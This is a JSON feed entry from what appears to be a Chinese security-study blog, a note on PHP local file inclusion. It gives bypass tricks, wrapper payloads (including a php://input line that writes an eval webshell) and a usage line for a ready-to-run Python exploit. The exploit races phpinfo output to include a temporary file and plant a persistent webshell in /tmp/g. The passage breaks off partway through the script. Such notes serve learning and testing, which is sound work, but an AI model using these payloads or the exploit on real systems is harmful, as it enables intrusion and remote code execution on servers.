{
    "version": "https://jsonfeed.org/version/1",
    "title": "十年磨一剑",
    "subtitle": "Go For 全栈",
    "icon": "http://yoursite.com/images/favicon.ico",
    "description": "My网安之路",
    "home_page_url": "http://yoursite.com",
    "items": [
        {
            "id": "http://yoursite.com/Web/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/",
            "url": "http://yoursite.com/Web/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/",
            "title": "文件包含漏洞",
            "date_published": "2024-03-26T15:29:08.000Z",
            "content_html": "<hr />\n<h1 id=\"文件包含漏洞\"><a class=\"anchor\" href=\"#文件包含漏洞\">#</a> 文件包含漏洞</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vWmVrZXI2Mi9wLzE1MzIyNzcxLmh0bWw=\">PHP 文件包含漏洞全面总结</span></p>\n<h2 id=\"php函数\"><a class=\"anchor\" href=\"#php函数\">#</a> PHP 函数</h2>\n<p><code>include()</code> 、 <code>include_once()</code> 、 <code>require()</code> 、 <code>require_once()</code></p>\n<h2 id=\"分类\"><a class=\"anchor\" href=\"#分类\">#</a> 分类</h2>\n<ul>\n<li>\n<p><strong>无限制本地文件包含漏洞</strong>：未对读取规则设置 <code>前缀路径/拓展名</code> ，可任意构造路径录取</p>\n<ul>\n<li>目录遍历： <code>http://www.abc.com/flie.php?file=../../../../etc/passwd</code></li>\n<li>可执行任意拓展名文件中的代码</li>\n</ul>\n</li>\n<li>\n<p><strong>有限制本地文件包含漏洞</strong></p>\n<ul>\n<li>%00 截断 bypass (误把它当成结束符，后面的数据直接忽略)： <code>magic_quotes_gpc=off</code> ，PHP 版本低于 5.3.4</li>\n<li>路径长度截断 bypass：叠加 <code>./</code>  增长路径，Windows 最长 <code>256B</code> ，Linux 最长 <code>4096B</code></li>\n<li>点号截断 bypass：只适用 <code>Windows</code>  系统，点号的长度大于 <code>256B</code>  造成拓展名截断</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"php伪协议\"><a class=\"anchor\" href=\"#php伪协议\">#</a> PHP 伪协议</h2>\n<table>\n<thead>\n<tr>\n<th>协议</th>\n<th style=\"text-align:left\">用法</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>php://filter</td>\n<td style=\"text-align:left\"><code>?filename=php://filter/read=convert.base64-encode/resource=xxx.php</code></td>\n<td>元封装器，设计用于数据流打开时筛选过滤应用，对本地磁盘文件进行读写</td>\n</tr>\n<tr>\n<td>php://input</td>\n<td style=\"text-align:left\">?file=php://input，POST 传入木马，①写入木马 <code>&lt;?php fputs(fopen('shell.php','w'),'&lt;?php @eval($_POST[cmd])?&gt;');?&gt;</code> ，②命令执行 <code>&lt;?php system('ls');?&gt;</code></td>\n<td>allow_url_include=on，enctype=&quot;multipart/form-data&quot; 时无效</td>\n</tr>\n<tr>\n<td>file://</td>\n<td style=\"text-align:left\">?file=file://c:/boot.ini</td>\n<td>直接读取本地文件的内容</td>\n</tr>\n<tr>\n<td>data://</td>\n<td style=\"text-align:left\">① <code>?file=data://text/plain,&lt;?php phpinfo();?&gt;</code> ②Base64 编码 <code>?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</code></td>\n<td>allow_url_fopen=on,allow_url_include=on</td>\n</tr>\n<tr>\n<td>phar://</td>\n<td style=\"text-align:left\">?file=phar:// 压缩包 / 解压文件， <code>?file=phar://shell.png/shell.php</code> ，任意拓展名都解析为压缩包</td>\n<td>对 zip 协议压缩的伪装 shell 文件进行解压，allow_url_fopen=on,allow_url_include=on,PHP&gt;=5.3.0</td>\n</tr>\n<tr>\n<td>zip://</td>\n<td style=\"text-align:left\">?file=zip://[压缩文件绝对路径]#[压缩文件内的子文件名]，url 编码 #为 %23， <code>?file=zip://D:/phpstudy/www/.../test.png%23shell.php</code>  (zip 必须是绝对路径)</td>\n<td>压缩，allow_url_fopen=on,allow_url_include=on,PHP&gt;=5.3.0</td>\n</tr>\n<tr>\n<td>expect://</td>\n<td style=\"text-align:left\"><code>?file=expect://ls</code></td>\n<td>执行系统命令，需要安装拓展</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"phpfilter筛选过滤应用\"><a class=\"anchor\" href=\"#phpfilter筛选过滤应用\">#</a> php://filter 筛选过滤应用</h2>\n<p>1、字符串过滤器：</p>\n<ul>\n<li><code>string.rot13</code>  对字符串执行 ROT13 转换</li>\n<li><code>string.toupper</code>  转换为大写</li>\n<li><code>string.tolower</code>  转换为小写</li>\n<li><code>string.strip</code> _tags 去除 <code>html</code>  和 <code>php</code>  标记</li>\n</ul>\n<p>2、转换过滤器：</p>\n<ul>\n<li><code>convert.base64-encode &amp; convert.base64-decode</code>  ：base64 编码 / 解码</li>\n<li><code>convert.quoted-printable-encode &amp; convert.quoted-printable-decode</code> ：将 quoted-printable 字符串转换为  <code>8-bit </code> 字符串</li>\n</ul>\n<p>3、压缩过滤器：</p>\n<ul>\n<li><code>zlib.deflate</code>  和 <code>zlib.inflate</code></li>\n<li><code>bzip2.compress</code>  和 <code>bzip2.decompress</code></li>\n</ul>\n<p>4、 加密过滤器：</p>\n<ul>\n<li><code>mcrypt.tripledes</code>  和 <code>mdecrypt.tripledes</code>  等</li>\n</ul>\n<h2 id=\"phpinfo包含临时文件\"><a class=\"anchor\" href=\"#phpinfo包含临时文件\">#</a> phpinfo 包含临时文件</h2>\n<p>找不到可以包含的文件，通过 phpinfo 获取临时文件名，进行包含</p>\n<blockquote>\n<p>处理 POST 数据包时，如果数据包里包含文件区块，无论你访问的代码中有没有处理文件上传的逻辑，PHP 都会将这个文件保存成一个临时文件（通常是 <code>/tmp/php[6个随机字符]</code> ），文件名可以在 $_FILES 变量中找到。这个临时文件，在请求结束后就会被删除。</p>\n<p>同时，因为 phpinfo 页面会将当前请求上下文中所有变量都打印出来，所以我们如果向 phpinfo 页面发送包含文件区块的数据包，则即可在返回包里找到 $_FILES 变量的内容，自然也包含临时文件名。</p>\n<p>但文件包含漏洞和 phpinfo 页面通常是两个页面，理论上我们需要先发送数据包给 phpinfo 页面，然后从返回页面中匹配出临时文件名，再将这个文件名发送给文件包含漏洞页面，进行 getshell。在第一个请求结束时，临时文件就被删除了，第二个请求自然也就无法进行包含。</p>\n</blockquote>\n<p>这个时候就需要用到条件竞争，具体流程如下：</p>\n<ul>\n<li>发送包含了 webshell 的上传数据包给 phpinfo 页面，这个数据包的 header、get 等位置需要塞满垃圾数据</li>\n<li>因为 phpinfo 页面会将所有数据都打印出来，1 中的垃圾数据会将整个 phpinfo 页面撑得非常大</li>\n<li>php 默认的输出缓冲区大小为 4096，可以理解为 php 每次返回 4096 个字节给 socket 连接</li>\n<li>所以，我们直接操作原生 socket，每次读取 4096 个字节。只要读取到的字符里包含临时文件名，就立即发送第二个数据包</li>\n<li>此时，第一个数据包的 socket 连接实际上还没结束，因为 php 还在继续每次输出 4096 个字节，所以临时文件此时还没有删除</li>\n<li>利用这个时间差，第二个数据包，也就是文件包含漏洞的利用，即可成功包含临时文件，最终 getshell</li>\n</ul>\n<h3 id=\"payload\"><a class=\"anchor\" href=\"#payload\">#</a> payload</h3>\n<p>访问 <code>ip:port/*.php?file=/etc/passwd</code> ，判断是否存在文件包含漏洞</p>\n<p><strong>python <span class=\"exturl\" data-url=\"aHR0cDovL2V4cC5weQ==\">exp.py</span> ip port 100</strong></p>\n<p>成功包含临时文件后，会执行 <code>&lt;?php file_put_contents('/tmp/g', '&lt;?=eval($_REQUEST[1])?&gt;')?&gt;</code> ，写入一个新的文件 <code>/tmp/g</code> ，这个文件就会永久留在目标机器上。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python </span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> sys</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> threading</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> socket</pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">setup</span><span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span> port<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    TAG<span class=\"token operator\">=</span><span class=\"token string\">\"Security Test\"</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    PAYLOAD<span class=\"token operator\">=</span><span class=\"token triple-quoted-string string\">\"\"\"%s\\r</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>&lt;?php file_put_contents('/tmp/g', '&lt;?=eval($_REQUEST[1])?>')?>\\r\"\"\"</span> <span class=\"token operator\">%</span> TAG</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    REQ1_DATA<span class=\"token operator\">=</span><span class=\"token triple-quoted-string string\">\"\"\"-----------------------------7dbff1ded0714\\r</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>Content-Disposition: form-data; name=\"dummyname\"; filename=\"test.txt\"\\r</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>Content-Type: text/plain\\r</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\\r</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>%s</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>-----------------------------7dbff1ded0714--\\r\"\"\"</span> <span class=\"token operator\">%</span> PAYLOAD</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    padding<span class=\"token operator\">=</span><span class=\"token string\">\"A\"</span> <span class=\"token operator\">*</span> <span class=\"token number\">5000</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    REQ1<span class=\"token operator\">=</span><span class=\"token triple-quoted-string string\">\"\"\"POST /phpinfo.php?a=\"\"\"</span><span class=\"token operator\">+</span>padding<span class=\"token operator\">+</span><span class=\"token triple-quoted-string string\">\"\"\" HTTP/1.1\\r</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=\"\"\"</span><span class=\"token operator\">+</span>padding<span class=\"token operator\">+</span><span class=\"token triple-quoted-string string\">\"\"\"\\r</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>HTTP_ACCEPT: \"\"\"</span> <span class=\"token operator\">+</span> padding <span class=\"token operator\">+</span> <span class=\"token triple-quoted-string string\">\"\"\"\\r</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>HTTP_USER_AGENT: \"\"\"</span><span class=\"token operator\">+</span>padding<span class=\"token operator\">+</span><span class=\"token triple-quoted-string string\">\"\"\"\\r</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>HTTP_ACCEPT_LANGUAGE: \"\"\"</span><span class=\"token operator\">+</span>padding<span class=\"token operator\">+</span><span class=\"token triple-quoted-string string\">\"\"\"\\r</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>HTTP_PRAGMA: \"\"\"</span><span class=\"token operator\">+</span>padding<span class=\"token operator\">+</span><span class=\"token triple-quoted-string string\">\"\"\"\\r</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\\r</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>Content-Length: %s\\r</pre></td></tr><tr><td data-num=\"25\"></td><td><pre>Host: %s\\r</pre></td></tr><tr><td data-num=\"26\"></td><td><pre>\\r</pre></td></tr><tr><td data-num=\"27\"></td><td><pre>%s\"\"\"</span> <span class=\"token operator\">%</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>REQ1_DATA<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>host<span class=\"token punctuation\">,</span>REQ1_DATA<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token comment\">#modify this to suit the LFI script   </span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    LFIREQ<span class=\"token operator\">=</span><span class=\"token triple-quoted-string string\">\"\"\"GET /lfi.php?file=%s HTTP/1.1\\r</pre></td></tr><tr><td data-num=\"30\"></td><td><pre>User-Agent: Mozilla/4.0\\r</pre></td></tr><tr><td data-num=\"31\"></td><td><pre>Proxy-Connection: Keep-Alive\\r</pre></td></tr><tr><td data-num=\"32\"></td><td><pre>Host: %s\\r</pre></td></tr><tr><td data-num=\"33\"></td><td><pre>\\r</pre></td></tr><tr><td data-num=\"34\"></td><td><pre>\\r</pre></td></tr><tr><td data-num=\"35\"></td><td><pre>\"\"\"</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span>REQ1<span class=\"token punctuation\">,</span> TAG<span class=\"token punctuation\">,</span> LFIREQ<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">phpInfoLFI</span><span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span> port<span class=\"token punctuation\">,</span> phpinforeq<span class=\"token punctuation\">,</span> offset<span class=\"token punctuation\">,</span> lfireq<span class=\"token punctuation\">,</span> tag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    s <span class=\"token operator\">=</span> socket<span class=\"token punctuation\">.</span>socket<span class=\"token punctuation\">(</span>socket<span class=\"token punctuation\">.</span>AF_INET<span class=\"token punctuation\">,</span> socket<span class=\"token punctuation\">.</span>SOCK_STREAM<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    s2 <span class=\"token operator\">=</span> socket<span class=\"token punctuation\">.</span>socket<span class=\"token punctuation\">(</span>socket<span class=\"token punctuation\">.</span>AF_INET<span class=\"token punctuation\">,</span> socket<span class=\"token punctuation\">.</span>SOCK_STREAM<span class=\"token punctuation\">)</span>    </pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    s<span class=\"token punctuation\">.</span>connect<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span> port<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    s2<span class=\"token punctuation\">.</span>connect<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span> port<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    s<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>phpinforeq<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    d <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>d<span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> offset<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>        d <span class=\"token operator\">+=</span> s<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>offset<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>        i <span class=\"token operator\">=</span> d<span class=\"token punctuation\">.</span>index<span class=\"token punctuation\">(</span><span class=\"token string\">\"[tmp_name] =&amp;gt; \"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>        fn <span class=\"token operator\">=</span> d<span class=\"token punctuation\">[</span>i<span class=\"token operator\">+</span><span class=\"token number\">17</span><span class=\"token punctuation\">:</span>i<span class=\"token operator\">+</span><span class=\"token number\">31</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>    <span class=\"token keyword\">except</span> ValueError<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token boolean\">None</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>    s2<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>lfireq <span class=\"token operator\">%</span> <span class=\"token punctuation\">(</span>fn<span class=\"token punctuation\">,</span> host<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>    d <span class=\"token operator\">=</span> s2<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">4096</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>    s<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>    s2<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>    <span class=\"token keyword\">if</span> d<span class=\"token punctuation\">.</span>find<span class=\"token punctuation\">(</span>tag<span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>        <span class=\"token keyword\">return</span> fn</pre></td></tr><tr><td data-num=\"62\"></td><td><pre></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>counter<span class=\"token operator\">=</span><span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">ThreadWorker</span><span class=\"token punctuation\">(</span>threading<span class=\"token punctuation\">.</span>Thread<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">,</span> l<span class=\"token punctuation\">,</span> m<span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span>args<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>        threading<span class=\"token punctuation\">.</span>Thread<span class=\"token punctuation\">.</span>__init__<span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>        self<span class=\"token punctuation\">.</span>event <span class=\"token operator\">=</span> e</pre></td></tr><tr><td data-num=\"68\"></td><td><pre>        self<span class=\"token punctuation\">.</span>lock <span class=\"token operator\">=</span>  l</pre></td></tr><tr><td data-num=\"69\"></td><td><pre>        self<span class=\"token punctuation\">.</span>maxattempts <span class=\"token operator\">=</span> m</pre></td></tr><tr><td data-num=\"70\"></td><td><pre>        self<span class=\"token punctuation\">.</span>args <span class=\"token operator\">=</span> args</pre></td></tr><tr><td data-num=\"71\"></td><td><pre></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">run</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>        <span class=\"token keyword\">global</span> counter</pre></td></tr><tr><td data-num=\"74\"></td><td><pre>        <span class=\"token keyword\">while</span> <span class=\"token keyword\">not</span> self<span class=\"token punctuation\">.</span>event<span class=\"token punctuation\">.</span>is_set<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>            <span class=\"token keyword\">with</span> self<span class=\"token punctuation\">.</span>lock<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>                <span class=\"token keyword\">if</span> counter <span class=\"token operator\">>=</span> self<span class=\"token punctuation\">.</span>maxattempts<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>                    <span class=\"token keyword\">return</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>                counter<span class=\"token operator\">+=</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>            <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>                x <span class=\"token operator\">=</span> phpInfoLFI<span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>self<span class=\"token punctuation\">.</span>args<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>                <span class=\"token keyword\">if</span> self<span class=\"token punctuation\">.</span>event<span class=\"token punctuation\">.</span>is_set<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>                    <span class=\"token keyword\">break</span>                </pre></td></tr><tr><td data-num=\"84\"></td><td><pre>                <span class=\"token keyword\">if</span> x<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>                    <span class=\"token keyword\">print</span> <span class=\"token string\">\"\\nGot it! Shell created in /tmp/g\"</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>                    self<span class=\"token punctuation\">.</span>event<span class=\"token punctuation\">.</span><span class=\"token builtin\">set</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>                    </pre></td></tr><tr><td data-num=\"88\"></td><td><pre>            <span class=\"token keyword\">except</span> socket<span class=\"token punctuation\">.</span>error<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>                <span class=\"token keyword\">return</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"91\"></td><td><pre></pre></td></tr><tr><td data-num=\"92\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">getOffset</span><span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span> port<span class=\"token punctuation\">,</span> phpinforeq<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre>    <span class=\"token triple-quoted-string string\">\"\"\"Gets offset of tmp_name in the php output\"\"\"</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>    s <span class=\"token operator\">=</span> socket<span class=\"token punctuation\">.</span>socket<span class=\"token punctuation\">(</span>socket<span class=\"token punctuation\">.</span>AF_INET<span class=\"token punctuation\">,</span> socket<span class=\"token punctuation\">.</span>SOCK_STREAM<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>    s<span class=\"token punctuation\">.</span>connect<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>    s<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>phpinforeq<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"98\"></td><td><pre>    d <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre>        i <span class=\"token operator\">=</span> s<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">4096</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre>        d<span class=\"token operator\">+=</span>i        </pre></td></tr><tr><td data-num=\"102\"></td><td><pre>        <span class=\"token keyword\">if</span> i <span class=\"token operator\">==</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>            <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre>        <span class=\"token comment\"># detect the final chunk</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre>        <span class=\"token keyword\">if</span> i<span class=\"token punctuation\">.</span>endswith<span class=\"token punctuation\">(</span><span class=\"token string\">\"0\\r\\n\\r\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"106\"></td><td><pre>            <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre>    s<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre>    i <span class=\"token operator\">=</span> d<span class=\"token punctuation\">.</span>find<span class=\"token punctuation\">(</span><span class=\"token string\">\"[tmp_name] =&amp;gt; \"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"109\"></td><td><pre>    <span class=\"token keyword\">if</span> i <span class=\"token operator\">==</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"110\"></td><td><pre>        <span class=\"token keyword\">raise</span> ValueError<span class=\"token punctuation\">(</span><span class=\"token string\">\"No php tmp_name in phpinfo output\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"111\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"112\"></td><td><pre>    <span class=\"token keyword\">print</span> <span class=\"token string\">\"found %s at %i\"</span> <span class=\"token operator\">%</span> <span class=\"token punctuation\">(</span>d<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">:</span>i<span class=\"token operator\">+</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"113\"></td><td><pre>    <span class=\"token comment\"># padded up a bit</span></pre></td></tr><tr><td data-num=\"114\"></td><td><pre>    <span class=\"token keyword\">return</span> i<span class=\"token operator\">+</span><span class=\"token number\">256</span></pre></td></tr><tr><td data-num=\"115\"></td><td><pre></pre></td></tr><tr><td data-num=\"116\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"117\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"118\"></td><td><pre>    <span class=\"token keyword\">print</span> <span class=\"token string\">\"LFI With PHPInfo()\"</span></pre></td></tr><tr><td data-num=\"119\"></td><td><pre>    <span class=\"token keyword\">print</span> <span class=\"token string\">\"-=\"</span> <span class=\"token operator\">*</span> <span class=\"token number\">30</span></pre></td></tr><tr><td data-num=\"120\"></td><td><pre></pre></td></tr><tr><td data-num=\"121\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"122\"></td><td><pre>        <span class=\"token keyword\">print</span> <span class=\"token string\">\"Usage: %s host [port] [threads]\"</span> <span class=\"token operator\">%</span> sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"123\"></td><td><pre>        sys<span class=\"token punctuation\">.</span>exit<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"124\"></td><td><pre></pre></td></tr><tr><td data-num=\"125\"></td><td><pre>    <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"126\"></td><td><pre>        host <span class=\"token operator\">=</span> socket<span class=\"token punctuation\">.</span>gethostbyname<span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"127\"></td><td><pre>    <span class=\"token keyword\">except</span> socket<span class=\"token punctuation\">.</span>error<span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"128\"></td><td><pre>        <span class=\"token keyword\">print</span> <span class=\"token string\">\"Error with hostname %s: %s\"</span> <span class=\"token operator\">%</span> <span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"129\"></td><td><pre>        sys<span class=\"token punctuation\">.</span>exit<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td 